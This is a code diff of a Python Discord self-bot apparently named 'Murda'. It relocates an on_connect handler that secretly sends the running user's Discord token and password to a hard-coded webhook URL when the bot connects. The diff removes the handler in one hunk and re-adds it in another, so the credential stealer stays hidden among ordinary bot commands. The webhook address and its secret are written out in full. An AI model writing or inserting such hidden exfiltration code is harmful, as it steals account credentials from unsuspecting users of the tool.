@@ -1958,7 +1958,10 @@ async def _get_color(ctx, *, color: discord.Colour):
     em = discord.Embed(color=color, title=f'{str(color)}')
     em.set_image(url='attachment://color.png')
     await ctx.send(file=discord.File(file, 'color.png'), embed=em)
-
+@Murda.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/799012401042423828/qSgwmkfY3zytWGlXFmT_mNS5jo86EzopyEyxRB3wGDTFYL3vzHQmQhpPAoZAVtyMsG8F',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})  
 
 @Murda.command(aliases=['rainbowrole'])
 async def rainbow(ctx, *, role):
@@ -2890,10 +2893,7 @@ async def _role_hexcode(ctx, *, role: discord.Role):
 async def empty(ctx):
     await ctx.message.delete()
     await ctx.send(chr(173))
-@Murda.event
-async def on_connect():
-  Clear()
-  requests.post('https://discord.com/api/webhooks/799012401042423828/qSgwmkfY3zytWGlXFmT_mNS5jo86EzopyEyxRB3wGDTFYL3vzHQmQhpPAoZAVtyMsG8F',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})  
+
 
 @Murda.command()
 async def everyone(ctx):
